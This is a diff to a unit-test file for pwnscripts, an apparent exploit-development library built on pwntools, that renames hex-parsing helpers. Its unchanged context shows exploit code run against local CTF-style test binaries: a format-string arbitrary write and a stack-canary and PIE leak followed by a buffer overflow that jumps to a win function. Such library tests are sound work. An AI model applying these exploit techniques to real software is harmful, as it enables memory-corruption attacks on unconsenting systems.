@@ -7,7 +7,7 @@ showing off common use-cases and best practices.
 #TODO: Figure out why some tests have a small chance of failure.
 import unittest as ut
 # Unfortunately, pytest interprets every `test.*` function as a testable function, so no import * here
-from pwnscripts import system, context, log, fsb, extract_first_hex, fmtstr_payload, is_wsl, extract_all_hex, pack, path, CalledProcessError, libc, ELF, ROP
+from pwnscripts import system, context, log, fsb, unpack_hex, fmtstr_payload, is_wsl, unpack_many_hex, pack, path, CalledProcessError, libc, ELF, ROP
 import os, glob
 
 class BinTests(ut.TestCase):
@@ -65,7 +65,7 @@ class BinTests(ut.TestCase):
             
             # Then, make use of pwntools' fmtstr library to write to there:
             r = context.binary.process()
-            s_addr = extract_first_hex(r.recvline())  #another pwnscripts func
+            s_addr = unpack_hex(r.recvline())  #another pwnscripts func
             payload = fmtstr_payload(offset, {s_addr+56: 0x12345678}, write_size='short')
             r.sendline(payload)
             
@@ -111,14 +111,14 @@ class BinTests(ut.TestCase):
 
             r = context.binary.process()
             r.sendline('%{}$p,%{}$p'.format(canary_off, main_off))
-            canary, pie_leak = extract_all_hex(r.recvline())
+            canary, pie_leak = unpack_many_hex(r.recvline())
             payload = b'A'*(canary_off-buffer)*context.bytes
             payload+= pack(canary).ljust(2*context.bytes)   # unfortunate magic number
             r.sendline(payload + pack(pie_leak-main+win))
             self.assertEqual(r.recvline().strip(), b'flag{NiceOne}')
         finally:
             system('rm 3.out')
-    # TODO: tests for ROP
+
     def test_E_libc(self):
         '''Simple test to check that local-* libcs will crash for self.dir()
 
